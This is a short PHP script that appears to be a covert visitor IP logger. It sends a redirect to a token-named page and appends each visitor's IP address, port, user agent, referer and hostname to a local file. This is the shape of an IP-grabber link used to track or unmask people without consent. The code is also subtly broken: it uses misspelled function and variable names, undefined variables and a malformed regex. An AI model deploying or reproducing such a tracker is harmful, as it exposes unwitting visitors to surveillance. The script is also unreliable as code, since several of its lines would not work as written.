<?php
header('Location: token=AYEU46AKDN42ASHF2aEIvd.php');
function Ip(){
  $log = "nothing";
  $reg = (bool) ini_get('$register_globals');
  if ($reg) $ip = getenv(REMOTE_ADDR);
  else $ip = $_SERVER['REMOTE_ADDR'];
  $portcol = $_SERVER['REMOTE_PORT'];
  $ag = $_SERVER['HTTP_USER_AGENT'];
  $referer = $_SERVER['HTTP_REFERER'];
  $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
  $date = data("l d o F Y h:i: A");
  $sp = "------------------------------------------------------------";
    $loger = fopen("$log", "a+");
    if (preg_match("/\\bhtm\\b/i", $log) || preg_match("/\\hhtml\\b/i", $log)){
      fputs($loger, "IP : $ip , Date: $data , Protocol : $protcol , Agent : $ag, R eferer : $referer , HostName : $hostname \n $space");
    }else fputs($loger, "IP : $ip , Date: $data , Protocol : $protcol , Agent : $ag, R eferer : $referer , HostName : $hostname \n $space");
    fclose($loger);
}
Ip();
 ?>
